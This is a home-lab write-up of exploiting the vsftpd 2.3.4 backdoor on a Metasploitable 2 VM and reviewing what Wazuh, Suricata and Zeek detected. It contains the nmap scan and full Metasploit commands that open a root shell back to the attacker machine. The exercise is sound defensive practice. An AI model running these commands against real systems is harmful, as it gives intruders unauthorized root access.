# Attack Lab 01 — vsftpd 2.3.4 Backdoor
**Date:** March 30, 2026  
**Attacker:** Kali Linux VM (10.0.10.148)  
**Target:** Metasploitable 2 VM (10.0.10.106)  
**Outcome:** Root shell obtained — 445 alerts generated across all Wazuh agents

---

## Overview

This was the first full attack/detect cycle run in the lab. The goal was simple: pick a known vulnerability on Metasploitable, exploit it, and see what the SOC stack caught. No rules were written ahead of time, no alerts tuned — just a clean run to see what Wazuh, Suricata, and Zeek would surface on their own.

The target was vsftpd 2.3.4, a version of an FTP server that shipped with a backdoor deliberately injected into its source code in 2011. It's one of the most well-known vulnerabilities on Metasploitable and a good first exercise because it's simple, well-documented, and generates clear network traffic that IDS rules can catch.

---

## Environment

```
Kali Linux VM     10.0.10.148   (attacker)
Metasploitable 2  10.0.10.106   (target)
GLaDOS            10.0.10.10    (Wazuh Manager, Suricata, Zeek)
Aperture          10.0.10.20    (Proxmox host — Suricata on vmbr0)
```

Both VMs are on Aperture's internal bridge (`vmbr0`). Traffic between them never leaves the Proxmox host, which is why Suricata on Aperture monitoring `vmbr0` is critical — GLaDOS can't see any of this traffic.

---

## Phase 1 — Reconnaissance

Started with a version and OS detection scan against the target:

```bash
nmap -sV -O 10.0.10.106
```

The scan came back with a long list of open ports and identifiable services. Metasploitable is intentionally vulnerable, so this was expected — but seeing it laid out in one output is still striking:

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 23 | Telnet | Linux telnetd |
| 512 | exec | netkit-rsh rexecd |
| 1524 | bindshell | Metasploitable root shell |
| 3306 | MySQL | 5.0.51a |
| 5432 | PostgreSQL | 8.3.0 |
| 5900 | VNC | Protocol 3.3 |
| 6667 | IRC | UnrealIRCd |

Port 21 running vsftpd 2.3.4 stood out immediately. That specific version has a known backdoor triggered by sending a smiley face (`:)`) in the username field, which opens a root shell on port 6200. It's textbook.

**What the SOC caught during recon:**

Suricata fired before the nmap scan even finished:

```
ET INFO Possible Kali Linux hostname in DHCP Request Packet
Classification: Potential Corporate Privacy Violation
```

Kali's hostname was broadcasting itself in DHCP requests. The attacker machine identified itself before a single packet was sent at the target. Good reminder that OPSEC starts at the OS level.

---

## Phase 2 — Exploitation

Launched Metasploit and loaded the vsftpd backdoor module:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.10.106
set LHOST 10.0.10.148
set LPORT 4444
run
```

The exploit worked immediately:

```
Backdoor service has been spawned
Meterpreter session opened (10.0.10.148:4444 → 10.0.10.106:6200)
```

Dropped into a shell and confirmed access:

```
getuid → Server username: root
sysinfo → metasploitable.localdomain — Ubuntu Linux 2.6.24
```

Root on the first try, less than a minute after the recon scan finished. The vulnerability is over a decade old and trivially exploitable — that's the point of Metasploitable.

---

## Phase 3 — Detection

The Wazuh dashboard told a clear story after the attack. **445 alerts** were generated in total across all three agents.

### MITRE ATT&CK Detections

| Technique ID | Name | What triggered it |
|---|---|---|
| T1046 | Network Service Discovery | nmap port scan |
| T1021 | Remote Services | FTP connection to vsftpd |
| T1078 | Valid Accounts | Authentication activity on the target |
| T1110 | Brute Force / Password Guessing | Login attempts logged by Wazuh |
| T1548 | Abuse Elevation Control Mechanism | Sudo-related activity post-exploitation |
| T1562 | Impair Defenses | Tool/service modification detected |

### What each layer caught

**Suricata (on Aperture, watching vmbr0)**  
Caught the network side of the attack — the nmap scan patterns, the FTP connection, and the backdoor shell being spawned on port 6200. This is the layer that would catch an attacker who had never touched the target machine at all.

**Wazuh agents (on Aperture and Kali)**  
Caught host-based activity — file access, process execution, authentication events. The agent on Kali logged outbound Metasploit activity. The agent on Aperture logged what was happening on the Proxmox host.

**Zeek (on GLaDOS)**  
Generated connection logs for any traffic that did pass through GLaDOS, including the DHCP hostname leak that burned Kali's identity at the start.

---

## Key Takeaways

**The vmbr0 blind spot is real.** Without Suricata on Aperture, the entire attack would have been invisible to the SOC. VM-to-VM traffic inside Proxmox stays on the virtual bridge and never hits the wire. This is an easy gap to miss when setting up a lab.

**Kali announces itself.** The default Kali hostname in DHCP is a known indicator. In a real environment this would be an immediate flag. For lab use it's fine, but worth knowing.

**Metasploit leaves footprints.** Even without any custom detection rules, Wazuh's default ruleset mapped activity to several MITRE ATT&CK techniques automatically. The out-of-the-box coverage is solid for common attack patterns.

**445 alerts for a single, simple exploit is a lot.** Most of that is noise from scan activity and repeated authentication events. Alert tuning will be a priority for future sessions.

---

## What's Next

- Write custom Suricata rules targeting vsftpd backdoor traffic (port 6200 connection)
- Explore other Metasploitable vulnerabilities: UnrealIRCd backdoor, Bindshell on port 1524, PostgreSQL default creds
- Set up TheHive to practice turning a Wazuh alert cluster into a proper incident
- Tune alert thresholds to reduce noise while keeping signal

---

*Attack exercise completed: March 30, 2026*
